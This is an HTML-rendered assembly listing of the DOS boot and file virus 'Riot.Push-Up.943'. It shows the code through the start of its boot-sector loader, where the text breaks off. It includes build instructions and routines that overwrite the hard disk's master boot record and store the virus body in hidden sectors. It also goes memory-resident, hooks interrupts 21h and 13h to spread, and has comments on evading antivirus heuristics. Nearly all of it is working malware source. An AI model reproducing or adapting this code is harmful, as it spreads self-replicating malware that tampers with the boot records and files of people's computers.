<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Boot-DOS.Riot.Push-Up.943 - PUSHUP.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; To assemble: Tasm /m9 filename.asm</span><span class="sc0">
</span><span class="sc1">; To link    : tlink /t filename.obj</span><span class="sc0">

    </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
    </span><span class="sc9">.code</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

    </span><span class="sc5">resid</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">5234h</span><span class="sc0">
    </span><span class="sc5">bs_marker</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc12">''</span><span class="sc0">                        </span><span class="sc1">;our mbr/bs marker (love me)</span><span class="sc0">
                                                </span><span class="sc1">;or (me love...)</span><span class="sc0">
    </span><span class="sc5">century</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">vsize</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">mem_para</span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">mem_kb</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)/</span><span class="sc2">1024</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">;the memory in kb's+1</span><span class="sc0">
    </span><span class="sc5">vsect</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)/</span><span class="sc2">512</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">;number of sectors occupied</span><span class="sc0">

</span><span class="sc5">host_start</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">vstart</span><span class="sc0">                        </span><span class="sc1">;jmp to virus code</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;pad byte, just for jmp to</span><span class="sc0">
                                                </span><span class="sc1">;compile 3 bytes</span><span class="sc0">

</span><span class="sc1">;Real virus-code begin at this entry....</span><span class="sc0">

</span><span class="sc5">vstart</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">;call next instruction</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                       </span><span class="sc1">;move the stackpointer into di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;load bp with the word at ss:[di]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">       </span><span class="sc1">;sub $ - 5 from it and get</span><span class="sc0">
                                        </span><span class="sc1">;relocation offset in BP</span><span class="sc0">
                                        </span><span class="sc1">;This is probably to fewl anti-virus</span><span class="sc0">
                                        </span><span class="sc1">;"heuristic" general signature</span><span class="sc0">
                                        </span><span class="sc1">;scanning. Might be outdated though.</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">;ax=psp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                      </span><span class="sc1">;10h=psp size</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">csip</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;fix jmp far (segment) to hosts code</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">spss</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;fixup real stack segment (for exe's)</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                   </span><span class="sc1">;save ds so we can restore it, if exe</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">;ds=cs=es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">resid</span><span class="sc0">                    </span><span class="sc1">;ax := 5234h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">resid</span><span class="sc0">                    </span><span class="sc1">;bx := 5234h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">;ax/bx/cx=5234h ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">infect_mbr</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">return_to_host</span><span class="sc0">      </span><span class="sc1">;Assume that if resident then</span><span class="sc0">
                    </span><span class="sc1">;the mbr must already be infected</span><span class="sc0">

</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">; int13h: Useful input:                         ; output</span><span class="sc0">
                                                </span><span class="sc1">; if function sucessfull</span><span class="sc0">
</span><span class="sc1">; Write Sector                                  ; ah = 00h</span><span class="sc0">
</span><span class="sc1">; ah = 03h                                      ; al = # of sectors written</span><span class="sc0">
</span><span class="sc1">; al = # of sectors to write</span><span class="sc0">
</span><span class="sc1">; ch = cylinder                                 ; if function NOT ok</span><span class="sc0">
</span><span class="sc1">; cl = sector                                   ; CF = set</span><span class="sc0">
</span><span class="sc1">; dh = head                                     ; ah contains status</span><span class="sc0">
</span><span class="sc1">; dl = drive                                    ; (not equal to 00)</span><span class="sc0">
</span><span class="sc1">;    - 00-7fh floppy disk</span><span class="sc0">
</span><span class="sc1">;    - 80-ffh fixed disk</span><span class="sc0">
</span><span class="sc1">; es:bx = segment:offset of buffer</span><span class="sc0">

</span><span class="sc1">; Note: The same goes for ah=2 (sector read).</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc5">infect_mbr</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; &lt;- Virus isn't resident!</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                     </span><span class="sc1">; =&gt; Read the first sector of drive</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">iobuf</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; C: (80h) to iobuf via function</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">; ah=2 / int 13h al = # of sectors</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                      </span><span class="sc1">; to read</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">                     </span><span class="sc1">; function ah=3 = sector write</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                        </span><span class="sc1">; Write es:bx (iobuf) to sector 2.</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">                         </span><span class="sc1">; on drive C: (dx=80h).</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">iobuf</span><span class="sc4">],</span><span class="sc2">03cebh</span><span class="sc0">  </span><span class="sc1">;insert jmp to our bootstrap, not</span><span class="sc0">
                    </span><span class="sc1">;necessary in mbr infections...</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mbr_bs_code</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;load si with code that will be</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">iobuf</span><span class="sc4">+</span><span class="sc2">03eh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;written to the sectors</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">mbr_bs_size</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">;(+2 due to marker)</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">;clear direction</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;store the mbr loading code in the org</span><span class="sc0">
                                        </span><span class="sc1">;mbr(iobuf) and without destorying</span><span class="sc0">
                                        </span><span class="sc1">;the partition table</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">                     </span><span class="sc1">;Write iobuf (boot-loading code and</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">;partition table to sector on on the</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">                 </span><span class="sc1">;hd</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">300h</span><span class="sc4">+</span><span class="sc5">vsect</span><span class="sc0">               </span><span class="sc1">;vsect = # of sectors occupied by virus</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;main virus code to sector 3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">;aim at sector 3</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">                         </span><span class="sc1">;sector write</span><span class="sc0">

</span><span class="sc5">go_resident</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;this goes resident via mcb's.... but only executed</span><span class="sc0">
</span><span class="sc1">;when started from exe/com file, else there is another routine...</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">;restore es to psp due to res-check...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">;save es for later use</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">;es=Program Segment Prefix</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;ds=Memory Control Block</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">;zero di</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">        </span><span class="sc1">;last MCB?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">return_to_host</span><span class="sc0">              </span><span class="sc1">;if not last mcb-block, bail</span><span class="sc0">


    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc5">mem_para</span><span class="sc0"> </span><span class="sc1">; allocated memory</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc5">mem_para</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; cs=ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                       </span><span class="sc1">; copy virus to TOM</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">; save di = 0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">vsize</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; size of virus in words</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">; clear direction (to inc DI &amp; SI)</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">               </span><span class="sc1">; copy virus up there</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;ds=0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">;save ds on the stack</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get int21h segment:offset adress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">o21</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;directly from the ivt's adress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">o21</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;load ds from the stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],(</span><span class="sc5">i21</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; set new interrupt 21h handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">         </span><span class="sc1">; to point to our virus code</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">; do the same thing, but this time</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; fix interrupt 13h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">o13</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">o13</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],(</span><span class="sc5">i13</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">i13</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc2">0f9h</span><span class="sc0">   </span><span class="sc1">;put a STC there so no re-hook</span><span class="sc0">
                                                </span><span class="sc1">;of interrupt 21h is being</span><span class="sc0">
                        </span><span class="sc1">;performed</span><span class="sc0">

</span><span class="sc5">mbr_already_infected</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;since mbr already infected</span><span class="sc0">
                                                </span><span class="sc1">;the virus should be resident</span><span class="sc0">
                                                </span><span class="sc1">;either via mbr or file...</span><span class="sc0">

</span><span class="sc5">return_to_host</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                  </span><span class="sc1">;restore ds</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                  </span><span class="sc1">;es=ds=psp</span><span class="sc0">


    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">infection_type</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;if infection_type = 0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">com_return</span><span class="sc0">                   </span><span class="sc1">;it's a com-file, else</span><span class="sc0">
                                                </span><span class="sc1">;assume exe-file</span><span class="sc0">

</span><span class="sc5">exe_return</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">                                     </span><span class="sc1">;disable maskable interrupts</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">spss</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;during ss/sp modifictions</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">spss</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">                         </span><span class="sc1">;recognize interrupt again</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">;clear ax before stating host</span><span class="sc0">
                                                </span><span class="sc1">;and...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">                                 </span><span class="sc1">;jmp far ptr org_exe cs:ip</span><span class="sc0">
    </span><span class="sc5">csip</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;exe-hosts original cs:ip</span><span class="sc0">
    </span><span class="sc5">spss</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;exe-hosts org ss:sp</span><span class="sc0">

</span><span class="sc5">com_return</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                             </span><span class="sc1">;com-file starts at cs:100h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">;save di at 100h</span><span class="sc0">
                                                </span><span class="sc1">;so we return to cs:100h</span><span class="sc0">
                                                </span><span class="sc1">;once we do a 'RET'</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">org_com</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;original 3 bytes stored</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">                                   </span><span class="sc1">;in org_com is copied</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;from source ds:si to</span><span class="sc0">
                                                </span><span class="sc1">;destination es:di</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;ret to 100h</span><span class="sc0">


</span><span class="sc5">mbr_bs_code</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;this code is written to</span><span class="sc0">
                                                </span><span class="sc1">;infected disks mbr/bs</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">cli</span><span class="sc0">                                     </span><span class="sc1">;disable maskable interrupts</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">;ss=0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                           </span><span class="sc1">;sp=7c00h</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">                                     </span><span class="sc1">;set stack to (sp:sp) 0:7c00h,</span><span class="sc0">
                                                </span><span class="sc1">;just below our current cs:ip</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">;cs=ds=0</span><span class="sc0">

</span><span class="sc5">allocate_memory_via_bios</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">413h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">mem_kb</span><span class="sc0">      </span><span class="sc1">;subtract bios-memory with</span><span class="sc0">
                        </span><span class="sc1">;virus size in kilobytes</span><span class="sc0">

    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">                                 </span><span class="sc1">;get memory from bios (kb's)</span><span class="sc0">
                                                </span><span class="sc1">;output in ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
